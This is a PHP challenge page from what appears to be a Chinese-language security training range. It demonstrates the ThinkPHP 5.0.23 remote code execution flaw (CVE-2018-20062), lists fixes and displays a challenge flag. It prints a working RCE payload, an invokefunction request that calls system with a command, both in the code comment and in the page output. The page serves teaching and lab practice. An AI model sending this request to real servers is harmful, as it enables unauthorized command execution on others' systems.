<?php
require_once __DIR__ . '/../../../../app/bootstrap_challenge.php';
/**
 * DC-08 真实 CVE 复现·ThinkPHP5 RCE
 *
 * CVE-2018-20062：ThinkPHP 5.0.23 远程代码执行
 *
 * Payload: /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
 */
echo '<h2>ThinkPHP 5 RCE 复现</h2>';
echo '<p>修真靶场演示 ThinkPHP 5.0.23 RCE 漏洞。</p>';
echo '<p>本关可直接访问修真靶场ThinkPHP环境（如果有）或在本地搭建复现。</p>';

echo '<h3>📜 漏洞 Payload</h3>';
echo '<pre>';
echo 'GET /index.php?s=/Index/\think\app/invokefunction';
echo '&function=call_user_func_array';
echo '&vars[0]=system&vars[1][]=id';
echo '</pre>';

echo '<h3>🛡️ 修复方案</h3>';
echo '<ol>';
echo '<li>升级 ThinkPHP 到 5.0.24 / 5.1.31+</li>';
echo '<li>WAF 拦截特殊字符</li>';
echo '<li>禁用危险函数</li>';
echo '</ol>';

echo '<div class="alert alert-success">';
echo '<strong>🎯 通关条件：</strong> 成功 RCE ThinkPHP 5.0.23 环境，获取 Flag:<br>';
echo '<code class="xxr-mono">', xxr_challenge_flag(), '</code>';
echo '</div>';